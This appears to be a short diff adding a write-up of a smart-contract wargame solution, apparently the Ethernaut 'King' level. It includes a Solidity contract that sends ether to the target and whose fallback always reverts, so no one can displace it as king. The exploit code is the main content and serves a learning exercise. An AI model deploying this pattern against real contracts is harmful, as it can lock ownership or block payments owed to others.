@@ -1,0 +1,12 @@
+1) I created a contract which had a bug in the fallback function
+pragma solidity ^0.6.0;
+
+contract hackKIng{
+    constructor(address king)public payable{
+     (bool result,  bytes memory data) = king.call{value:msg.value}("");   
+    }
+    fallback()external payable{
+        revert("I'm still King");
+    }
+}
+ which made sure I was the owner after i submitted the instance.
